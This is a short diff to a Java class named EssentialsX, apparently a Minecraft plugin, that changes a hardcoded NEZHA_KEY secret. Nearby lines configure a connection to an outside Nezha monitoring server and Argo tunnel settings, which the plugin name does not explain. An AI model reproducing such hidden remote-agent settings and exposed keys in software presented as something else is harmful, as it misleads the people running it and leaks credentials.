@@ -77,7 +77,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nezha.babiq.eu.org");
         env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "XnNzSqs00tfBhy0YIR");
+        env.put("NEZHA_KEY", "phuBipoLnkC7vcwJnD");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
